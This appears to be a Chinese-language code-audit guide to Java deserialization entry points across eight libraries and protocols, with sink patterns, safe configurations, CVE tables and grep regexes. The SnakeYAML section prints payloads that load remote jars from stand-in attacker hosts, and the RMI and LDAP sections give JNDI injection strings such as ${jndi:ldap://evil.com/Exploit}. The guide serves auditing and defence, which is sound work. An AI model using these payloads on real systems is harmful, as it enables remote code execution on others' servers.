# Java 反序列化入口点详解

## 目录

- [1. Java 原生反序列化](#1-java-原生反序列化)
- [2. Fastjson](#2-fastjson)
- [3. Jackson](#3-jackson)
- [4. XStream](#4-xstream)
- [5. Hessian](#5-hessian)
- [6. SnakeYAML](#6-snakeyaml)
- [7. RMI](#7-rmi)
- [8. LDAP](#8-ldap)
- [9. 通用审计框架](#9-通用审计框架)

---

## 1. Java 原生反序列化

### 识别特征

```java
import java.io.ObjectInputStream;
import java.io.ByteArrayInputStream;
import java.io.FileInputStream;
```

### 危险 Sink 方法

```java
// 核心 Sink
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();     // ← 反序列化触发点
Object obj = ois.readUnshared();   // ← 同样触发

// 常见输入来源
// 1. HTTP Body (最常见的攻击场景)
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
obj = ois.readObject();

// 2. Base64 解码 + 反序列化 (WAF 绕过)
byte[] data = Base64.getDecoder().decode(request.getParameter("data"));
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
obj = ois.readObject();

// 3. 文件反序列化 (需要路径穿越辅助)
ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
obj = ois.readObject();

// 4. Cookie 反序列化
byte[] cookieBytes = Base64.getDecoder().decode(cookie.getValue());
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(cookieBytes));
obj = ois.readObject();

// 5. WebSocket 消息
@OnMessage
public void onMessage(byte[] message, Session session) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(message));
    obj = ois.readObject();
}

// 6. RMI 回调
// java.rmi.server.UnicastRemoteObject 中的远程方法参数
```

### 安全/不安全模式

```java
// ❌ 高危：直接反序列化 HTTP Body
@PostMapping("/api/deserialize")
public String deserialize(HttpServletRequest request) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
    Object obj = ois.readObject();
    return obj.toString();
}

// ⚠️ 部分防护：ValidatingObjectInputStream (Apache Commons IO)
// 但白名单可能不完整
ValidatingObjectInputStream ois = new ValidatingObjectInputStream(inputStream);
ois.accept(AllowedClass.class);  // 仅允许特定类
Object obj = ois.readObject();

// ⚠️ 部分防护：LookAheadObjectInputStream
// 检查类名但不检查继承链中的 gadget

// ✅ 安全：SerializeKiller / NOTOFF (阿里)
// 使用专门的序列化过滤器
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("!*"); // 拒绝所有
```

### Java 原生序列化过滤器 (JEP 290/JEP 415)

```java
// JDK 9+ JEP 290: 全局过滤器
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.base/*;!*");  // 仅允许 java.base 包
ObjectInputFilter.Config.setSerialFilter(filter);

// JDK 17+ JEP 415: Context-Specific 过滤器
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=10;maxarray=1000;java.util.*;!*");
ois.setObjectInputFilter(filter);

// 检查系统是否配置了全局过滤器
System.getProperty("jdk.serialFilter");

// 常见安全配置值:
// "maxbytes=*;maxdepth=*;maxrefs=*;maxarray=*"
// "!org.apache.commons.collections.*"
```

### 搜索正则

```bash
grep -rnE "readObject\(\)|readUnshared\(\)|new ObjectInputStream\(" --include="*.java" | grep -v "System.in\|test\|Test"
grep -rnE "ValidatingObjectInputStream|LookAheadObjectInputStream|ObjectInputFilter" --include="*.java"
grep -rn "jdk.serialFilter\|serialFilter" --include="*.java" --include="*.properties"
```

---

## 2. Fastjson

### 识别特征

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.parser.ParserConfig;
```

### 危险 Sink 方法

```java
// 核心解析方法
JSON.parse(jsonString);                    // ← 反序列化入口
JSON.parseObject(jsonString);              // ← 反序列化入口
JSON.parseObject(jsonString, Object.class); // ← 泛型 Object → 多态反序列化
JSON.parseArray(jsonString);               // ← 数组反序列化

// JSONObject/JSONArray
JSONObject.parseObject(jsonString);
JSONArray.parseArray(jsonString);
```

### autoType 检测

```java
// ❌ 危险：开启了 autoType
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

// ❌ 危险：通过 JVM 参数开启
// -Dfastjson.parser.autoTypeSupport=true

// ⚠️ 危险：使用 SafeMode 但版本低
ParserConfig.getGlobalInstance().setSafeMode(true);  // 1.2.68+ 才有效

// ✅ 安全：未开启 autoType，默认 SafeMode
```

### Fastjson 版本与利用速查

| 版本 | 利用链 | 条件 |
|------|--------|------|
| ≤ 1.2.24 | JdbcRowSetImpl JNDI / TemplatesImpl | 无限制 |
| ≤ 1.2.47 | autoType 绕过 (通过 ClassLoader) | 需开启 autoType |
| ≤ 1.2.68 | expectClass 绕过 (通过 Throwable 继承) | 需 autoTypeSupport=true |
| ≤ 1.2.80 | 新 autoType 绕过 (利用特定 JDK 类) | 需 JDK 特定版本 |
| 2.0.x+ | 新的 autoType 机制 | SafeMode 默认开启 |

### 搜索正则

```bash
grep -rnE "JSON\.parseObject\(|JSON\.parse\(|JSONObject\.parseObject\(|JSONArray\.parseArray\(" --include="*.java"
grep -rnE "ParserConfig.*AutoTypeSupport|autoTypeSupport.*true|setAutoTypeSupport|SafeMode" --include="*.java"
grep -rn "fastjson" pom.xml
find . -name "fastjson-*.jar"
```

---

## 3. Jackson

### 识别特征

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.DefaultTyping;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.annotation.JsonSubTypes;
```

### 危险 Sink 方法

```java
ObjectMapper mapper = new ObjectMapper();

// ❌ 关键 1: enableDefaultTyping 开启 → 多态反序列化
mapper.enableDefaultTyping();                          // 全部类型
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);  // 非 final 类
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);

// ❌ 关键 2: readValue 泛型为 Object (结合 enableDefaultTyping)
User user = mapper.readValue(json, User.class);       // ✅ 安全（指定具体类型）
Object obj = mapper.readValue(json, Object.class);    // ❌ 危险（泛型 Object）
Serializable obj = mapper.readValue(json, Serializable.class);  // ❌ 危险

// ❌ 关键 3: @JsonTypeInfo + @JsonSubTypes 注解
// 在 Controller 参数中使用多态注解
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.PROPERTY)
public class Animal { ... }
// 若 Animal 作为 @RequestBody 参数类型 → 多态反序列化
```

### Jackson 利用条件组合

| 条件 | 状态 |
|------|------|
| `enableDefaultTyping()` + `readValue(json, Object.class)` | 🔴 可 RCE |
| `@JsonTypeInfo(use=Id.CLASS)` + 参数类型含多态注解 | 🔴 可 RCE |
| `enableDefaultTyping()` + 指定类型 | 🟢 安全（指定类型不走多态） |
| 无 `enableDefaultTyping` | 🟢 安全 |

### 搜索正则

```bash
grep -rnE "enableDefaultTyping|ENABLE_DEFAULT_TYPING|DefaultTyping|ACTIVATE_DEFAULT_TYPING" --include="*.java"
grep -rnE "@JsonTypeInfo\(|@JsonSubTypes\(|JsonTypeInfo\.Id\.CLASS" --include="*.java"
grep -rnE "readValue\(.*Object\.class|readValue\(.*Serializable" --include="*.java"
```

---

## 4. XStream

### 识别特征

```java
import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;
import com.thoughtworks.xstream.security.*;
```

### 危险 Sink 方法

```java
// 核心解析方法
XStream xstream = new XStream();
Object obj = xstream.fromXML(xmlInput);  // ← XML 反序列化

// ❌ 高危：new XStream() 无安全框架
XStream xstream = new XStream(new DomDriver());
xstream.fromXML(userXml);

// ✅ 安全：设置了 Permission 白名单
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);   // 拒绝所有
xstream.addPermission(NoPermission(AllowedClass.class));  // 仅允许特定类
xstream.allowTypes(new Class[]{AllowedClass.class});

// ✅ 安全：使用 setupDefaultSecurity (1.4.7+)
XStream.setupDefaultSecurity(xstream);
xstream.allowTypes(new Class[]{MyClass.class});
```

### XStream 历史 CVE 速查

| CVE | 影响版本 | CVSS | 利用链 |
|-----|---------|------|--------|
| CVE-2021-39144 | ≤ 1.4.17 | 9.8 | 通过 `sun.reflect.annotation.AnnotationInvocationHandler` |
| CVE-2021-39145/39146/39147 | ≤ 1.4.17 | 8.5 | 多链绕过 |
| CVE-2021-29505 | ≤ 1.4.16 | 9.8 | EventHandler 链 |
| CVE-2021-21351 | ≤ 1.4.15 | 9.1 | 嵌套类型绕过 |
| CVE-2020-26217 | ≤ 1.4.13 | 9.8 | 远程代码执行 |

### 搜索正则

```bash
grep -rnE "new XStream\(\)|XStream.*fromXML|XStream\(.*Driver\)" --include="*.java"
grep -rnE "addPermission|allowTypes|denyTypes|setupDefaultSecurity|NoTypePermission" --include="*.java"
find . -name "xstream-*.jar"
```

---

## 5. Hessian

### 识别特征

```java
import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.HessianOutput;
import com.caucho.hessian.io.SerializerFactory;

// Dubbo 中的 Hessian
import org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput;
```

### 危险 Sink 方法

```java
// 核心解析
HessianInput input = new HessianInput(inputStream);
Object obj = input.readObject();      // ← 反序列化

Hessian2Input h2Input = new Hessian2Input(inputStream);
Object obj = h2Input.readObject();    // ← 反序列化

// Hessian Servlet
// web.xml 中配置 HessianServlet → 自动处理 Hessian 请求

// Dubbo 中使用 Hessian2 序列化
// dubbo:// 协议默认使用 Hessian2
```

### Hessian vs Java 原生序列化

| 特性 | Java 原生 | Hessian |
|------|----------|---------|
| 跨语言 | ❌ | ✅ |
| classpath gadget 可用性 | ✅ 大量 gadget | ⚠️ 部分兼容 |
| 利用难度 | 低 | 中（需 Hessian 专用 gadget） |
| JDK 版本限制 | ≤ 8u191 (JNDI) | 无 JDK 限制 |

### 搜索正则

```bash
grep -rnE "HessianInput|Hessian2Input|SerializerFactory|HessianServlet|HessianServiceExporter|HessianProxyFactory" --include="*.java"
grep -rnE "DubboProtocol|hessian2|Hessian2Serialization|Hessian2ObjectInput" --include="*.java"
```

---

## 6. SnakeYAML

### 识别特征

```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
```

### 危险 Sink 方法

```java
// ❌ 高危：Yaml.load() 无类型限制 → 可实例化任意 Java 类
Yaml yaml = new Yaml();
Object obj = yaml.load(userInput);  // ← 反序列化

// ❌ 高危：new Yaml() 默认 Constructor 不安全
Yaml yaml = new Yaml(new Constructor(AnyClass.class));
// Constructor 默认允许递归构造

// ⚠️ 危险：即使限制了类型，仍可能通过嵌套注入
// 如果 MyConfig 类中有 List<Object> 字段 → gadget 链

// ✅ 安全：Yaml.loadAs() 限制了类型（但仍有绕过可能）
MyConfig obj = yaml.loadAs(userInput, MyConfig.class);

// ✅ 安全：使用 SafeConstructor
Yaml yaml = new Yaml(new SafeConstructor());
Object obj = yaml.load(userInput);

// ✅ 安全：Spring Boot YamlPropertiesFactoryBean (安全)
```

### SnakeYAML Payload

```yaml
# CVE-2022-1471: Spring Boot SnakeYAML RCE
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://evil.com/evil.jar"]
  ]]
]

# 经典 RCE
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/yaml-payload.jar"]
  ]]
]

# Spring PropertySource
spring:
  context:
    initializer:
      classes: !!javax.script.ScriptEngineManager [...]
```

### 搜索正则

```bash
grep -rnE "Yaml\(\)\.load\(|new Yaml\(\)|Yaml\(new Constructor" --include="*.java" | grep -v "loadAs"
grep -rnE "SafeConstructor|CustomConstructor" --include="*.java"
```

---

## 7. RMI

### 识别特征

```java
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
```

### 危险 Sink 方法

```java
// RMI 客户端 lookup
Naming.lookup("rmi://evil.com:1099/Exploit");  // ← 远程对象
Registry registry = LocateRegistry.getRegistry("evil.com", 1099);
registry.lookup("Exploit");                     // ← 远程对象

// RMI 服务端导出
UnicastRemoteObject.exportObject(obj, port);    // ← 服务端暴露
Naming.bind("rmi://localhost/Service", obj);    // ← 绑定对象
```

### RMI 攻击面

```
1. 客户端 lookup 攻击：
   - lookup("rmi://evil:1099/obj") → 远程加载恶意类 → RCE
   - JDK ≤ 8u113: 无限制
   - JDK 8u113-8u191: 需 trustURLCodebase=true
   - JDK ≥ 8u191: 无法远程加载，需本地 gadget

2. 服务端 bind/rebind 攻击：
   - 如果 bind 的对象含反序列化 gadget → 客户端 lookup 时触发

3. Registry 反序列化攻击：
   - Registry 的 bind/rebind/lookup 方法参数被反序列化
   - 直接向 Registry 1099 端口发送恶意序列化数据
```

### 搜索正则

```bash
grep -rnE "Naming\.lookup\(|LocateRegistry\.getRegistry|LocateRegistry\.createRegistry|UnicastRemoteObject\.exportObject" --include="*.java"
grep -rnE "java\.rmi\.server\.codebase|java\.rmi\.server\.useCodebaseOnly" --include="*.java" --include="*.properties"
```

---

## 8. LDAP

### 识别特征

```java
import javax.naming.InitialContext;
import javax.naming.InitialDirContext;
import javax.naming.directory.DirContext;
import javax.naming.ldap.InitialLdapContext;
```

### 危险 Sink 方法

```java
// ❌ 危险：lookup URL 用户可控
Hashtable<String, String> env = new Hashtable<>();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
env.put(Context.PROVIDER_URL, userUrl);  // ← ldap://evil.com/Exploit
DirContext ctx = new InitialDirContext(env);
Object obj = ctx.lookup("");  // lookup 触发

// ❌ 危险：直接 lookup 用户 URL
InitialContext ctx = new InitialContext();
ctx.lookup(userUrl);  // ← ldap://evil.com/Exploit → JNDI 注入

// Log4j JNDI 特征 (CVE-2021-44228)
ctx.lookup("${jndi:ldap://evil.com/Exploit}");
```

### JNDI 注入条件

| JDK 版本 | LDAP | RMI | 条件 |
|---------|------|-----|------|
| ≤ 8u113 | ✅ | ✅ | 无限制 |
| 8u113-8u191 | ✅ | ✅ | `trustURLCodebase=true` |
| ≥ 8u191 | ❌ | ❌ | 需本地 classpath gadget |

### 搜索正则

```bash
grep -rnE "\.lookup\(|InitialDirContext|InitialLdapContext|InitialContext" --include="*.java"
grep -rnE "PROVIDER_URL|java\.naming\.provider\.url|ldap://|rmi://" --include="*.java"
```

---

## 9. 通用审计框架

### 反序列化入口点分类

```
入口来源分类：
├── HTTP Body → readObject(InputStream from request)
│   └── 最常见场景，路由分析优先
├── HTTP Parameter/Header → Base64 → readObject
│   └── WAF 绕过模式
├── Cookie → Base64 → readObject
│   └── Shiro RememberMe 经典场景
├── File → readObject → 需路径穿越辅助
├── RMI → 远程方法调用触发反序列化
├── JNDI → LDAP/RMI lookup 触发
├── WebSocket → Binary 消息
└── 消息队列 → 需 jms/amqp 反序列化配置
```

### 入口点判定矩阵

```
判定逻辑：
1. readObject() 的 InputStream 参数来源？
   ├── request.getInputStream() → ✅ HTTP Body 可达 → 高
   ├── Base64.decode(request.getParameter()) → ✅ HTTP 参数可达 → 高
   ├── new FileInputStream(path) → ⚠️ 需路径穿越 → 中
   ├── cookie.getValue() → ✅ HTTP Cookie → 高
   └── 固定字节数组/文件 → ❌ 不可控 → 排除

2. HttpServlet/Controller 映射？
   ├── @PostMapping 直接调用 readObject → ✅ 无鉴权
   ├── @PostMapping 但有 @PreAuthorize → ⚠️ 需认证
   └── 内部调用，不可从 Web 层触发 → ❌ 排除

3. 是否有反序列化过滤器？
   ├── ObjectInputFilter → ⚠️ 检查过滤规则是否可绕过
   ├── ValidatingObjectInputStream → ⚠️ 检查白名单是否完整
   └── 无任何过滤 → 🔴 直接高危
```
